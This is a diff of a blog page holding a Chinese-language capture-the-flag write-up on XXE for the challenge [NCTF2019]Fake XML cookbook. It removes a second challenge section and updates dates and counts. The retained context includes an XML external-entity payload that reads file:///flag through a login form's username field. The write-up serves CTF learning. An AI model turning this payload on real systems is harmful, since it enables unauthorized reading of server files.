@@ -29,9 +29,8 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.0.jpg">
 <meta property="og:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.1.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.2.png">
 <meta property="article:published_time" content="2021-03-26T04:50:45.000Z">
-<meta property="article:modified_time" content="2021-03-28T09:13:23.058Z">
+<meta property="article:modified_time" content="2021-09-12T14:09:53.258Z">
 <meta property="article:author" content="六公子买单">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://jingdaqiang.github.io/2021/03/26/XXE/1.0.jpg">
@@ -184,7 +183,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-28 17:13:23" itemprop="dateModified" datetime="2021-03-28T17:13:23+08:00">2021-03-28</time>
+                <time title="Modified: 2021-09-12 22:09:53" itemprop="dateModified" datetime="2021-09-12T22:09:53+08:00">2021-09-12</time>
               </span>
 
           
@@ -207,8 +206,6 @@
 <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>题目暗示很明显了XXE漏洞，登录抓包.username和password都是xml格式,增加恶意实体</p>
 <p><img src="/2021/03/26/XXE/1.1.png"><br>读到了文件，读flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p><img src="/2021/03/26/XXE/1.2.png"><br>和上题一样，尝试用上面的代码读flag，无果</p>
 
     </div>
 
@@ -289,7 +286,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NCTF2019-Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NCTF2019-True-XML-cookbook"><span class="nav-number">2.</span> <span class="nav-text">[NCTF2019]True XML cookbook</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NCTF2019-Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">[NCTF2019]Fake XML cookbook</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -303,7 +300,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -312,7 +309,7 @@
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
